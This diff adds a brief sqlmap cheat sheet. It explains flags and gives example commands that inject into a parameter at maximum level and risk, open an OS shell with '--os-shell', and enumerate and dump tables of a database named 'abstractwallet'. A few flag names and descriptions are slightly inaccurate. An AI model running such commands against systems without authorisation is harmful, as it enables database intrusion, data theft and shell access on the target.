@@ -1,0 +1,25 @@
+SQL Map Explained
+
+sqlmap -l sqli.data -p alias --thread=5 --level 5 --risk 3 --no-cast --flush-session --random-agent --batch
+
+(-l or -r) 				to read the text file
+-p 						to set the vulnerable parameter to define
+--thread 				to increase speed
+--level 5 				for depth
+--risk 3  				for risk level
+--dbs 					to enumerate the database
+--flush-session 		to clear the cache from memory
+-D 						to define database
+-T 						to define table
+-C 						to column define
+--dump  				for saving all selected database (-D), table(-T), & column(-C), data
+
+Eg: sqlmap -l sqli.data -p alias --thread=5 --level 5 --risk 3 --no-cast --random-agent 		--batch --os-shell -D abstractwallet --tables
+
+Eg: sqlmap -l sqli.data -p alias --thread=5 --level 5 --risk 3 --no-cast --random-agent 		--batch --os-shell -D abstractwallet -T table1 --columns
+
+Eg: sqlmap -l sqli.data -p alias --thread=5 --level 5 --risk 3 --no-cast --random-agent 		--batch --os-shell -D abstractwallet -T table1 -C column1 --dump
+
+
+sqlmap -l sqli.data -p alias --thread=5 --level 5 --risk 3 --no-cast --flush-session --random-agent --dbs
+
